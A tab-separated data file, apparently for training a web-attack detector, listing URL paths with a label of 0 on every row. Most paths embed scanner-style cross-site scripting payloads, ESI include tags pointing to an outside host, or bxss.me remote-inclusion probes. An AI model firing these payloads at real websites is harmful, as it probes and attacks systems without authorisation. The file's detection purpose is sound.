sentences	labels
/jsearchfront&template&jcse&http:&&bxss.me&t&fit.txt?.jpg/**/images/plugin/waterpull/pinterest_grid.js 	 0
/kjcx&kjzl&fzzl&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&2020wzqh&wzqh_gzbs&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gjcp&clhlbj&201411&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/jsearchfront&http:&&bxss.me&t&fit.txt?.jpg/****/110105008056111/16/images/hanweb.css 	 0
/gjcp&jxjcj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/aux&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/module&web&http:&&bxss.me&t&fit.txt?.jpg/*****/simple/css/jpage.css 	 0
/inc&api&sources?resource=alert(/***/)&format=txt 	 0
/jsearchfront&template&http:&&bxss.me&t&fit.txt?.jpg/***************/16/images/plugin/selectpick/js.js 	 0
/ywly&gccb&hjgc&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/public&dashboard&index&41730?did=4&period=3"">alert(/***/) 	 0
/jsearchfront&template&jcse&110105008056111&http:&&bxss.me&t&fit.txt?.jpg/******/plugin/waterpull/pinterest_grid.js 	 0
/ywly&gjzqq&bmz&mxg&201412&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xwzx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/kjcx&qyzz&zjzj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/spzq&20210326&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xxgk&zfwjn&1088&1095&list.html?new=0.12735219527013664<esi:include src=""http://*******/rpb.png""/> 	 0
/xwzx&dependencies&index?search="">alert(/***/) 	 0
/kjcx&jsly&gcdzyqzysjx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/jsearchfront&categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1<esi:include src=""http://*******/rpb.png""/>&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 	 0
/prn&dashboard&index&41730?did=4&period=3"">alert(/***/) 	 0
/cgi-bin&wp-admin&admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
/xwzx&xydt&2016hydt&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/vc&ui&lib&http:&&bxss.me&t&fit.txt?.jpg/******/bootstrap/linkbutton.css 	 0
/database&js&editor&third-party&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xwzx&mtgz&2015_mtdt&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/searchfinancial.jspx?channelid=1480&producttype=2&querystr=1<esi:include src=""http:?channelid=1480&producttype=2&querystr=1<esi:include src=""http://*******/rpb.png""/>&renew=0&termtype=0 	 0
/lz&system&2021&10&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztpd&system&2020&06&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xxgk&zzxxgk&tjj&zfxxgkml_2127&lzyj&list.html?new=0.6905497045448936<esi:include src=""http://*******/rpb.png""/> 	 0
/ru&dependencies&index?search="">alert(/***/) 	 0
/_nuxt&packages&select&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xxgk&http:&&bxss.me&t&fit.txt?.jpg/***/zfxxgkml_2127/jgzn_2042/list.html 	 0
/jsearchfront&template&jcse&110105008056111&16&http:&&bxss.me&t&fit.txt?.jpg/******/voice/voice.css 	 0
/ywly&gccb&gcsg&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztpd&system&count&0036012&000000000000&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/bi-security-login&login.jsp?msi=false&redirect="><img/***/onerror=alert(document.domain)> 	 0
/con&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/fr&api&sources?resource=alert(/***/)&format=txt 	 0
/jsearchfront&template&jcse&110105008056111&16&images&http:&&bxss.me&t&fit.txt?.jpg/**********/css.css 	 0
/jsearchfront&template&jcse&110105008056111&http:&&bxss.me&t&fit.txt?.jpg/******/main.css 	 0
/gjcp&nyjx&images&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/es&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/shzr&mswpmm&common&signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 0
/gygj&ssgs&zggj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/sample.php?theme=<script>alert(?theme=<script>alert(/***********/)</script> 	 0
/lcgg&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/en&ourbusiness&rdandmanufacture&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/images&2018index&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ldzc&http:&&bxss.me&t&fit.txt?.jpg/******/t20161016_531.html 	 0
/jsearchfront&search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1<esi:include src=""http://*******/rpb.png""/>&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111 	 0
/was5&api&sources?resource=alert(/***/)&format=txt 	 0
/xxgk&qyzdsx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/system&resource&js&news&video&mp4&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/u6ca1&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/x241&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
